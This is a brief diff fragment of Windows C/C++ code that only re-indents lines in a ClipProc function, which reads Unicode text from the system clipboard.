@@ -70,9 +70,9 @@ void WriteDateTime(HANDLE hFile) {
 }
 
 void ClipProc(HWND hWnd) {
-	if(!OpenClipboard(hWnd)) return;
+    if(!OpenClipboard(hWnd)) return;
     HANDLE clipData = GetClipboardData(CF_UNICODETEXT);
-	if(!clipData) return;
+    if(!clipData) return;
     LPCWSTR wideClipText = (LPCWSTR) GlobalLock(clipData);
     GlobalUnlock(clipData);
     CloseClipboard();
